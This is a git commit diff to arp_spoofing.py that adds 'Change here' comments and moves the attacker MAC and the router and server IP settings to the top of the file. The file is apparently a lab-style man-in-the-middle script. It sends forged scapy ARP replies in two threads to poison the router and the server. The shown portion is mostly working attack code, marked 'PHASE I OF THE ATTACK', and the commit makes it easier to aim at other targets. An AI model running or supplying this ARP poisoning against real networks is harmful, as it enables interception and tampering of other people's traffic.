a2e7312a745a0cfb2e0000cba65b4d6ac1f8065a
Alexandru-Istrate <149588114+Alexandru-Istrate@users.noreply.github.com>
2024-09-25 14:42:07 +0300

    Update arp_spoofing.py - Add comments for ease of use

--- arp_spoofing.py
+++ arp_spoofing.py
@@ -4,6 +4,11 @@ import time
 
 # PHASE I OF THE ATTACK
 
+my_mac_address = '02:42:c6:07:00:03' # Change here
+router_ip_address = '198.7.0.1' # Change here
+server_ip_address = '198.7.0.2' # Change here
+
+
 def send_arp(my_mac_address, source_ip, destination_ip):
     a = ARP(
             hwsrc=my_mac_address,
@@ -16,9 +21,7 @@ def send_arp(my_mac_address, source_ip, destination_ip):
         send(a, verbose=False)
         time.sleep(2)
 
-my_mac_address = '02:42:c6:07:00:03'
-router_ip_address = '198.7.0.1'
-server_ip_address = '198.7.0.2'
+
 thread_for_server = threading.Thread(target=send_arp, args=(my_mac_address, router_ip_address, server_ip_address))
 
 thread_for_router = threading.Thread(target=send_arp, args=(my_mac_address, server_ip_address, router_ip_address))
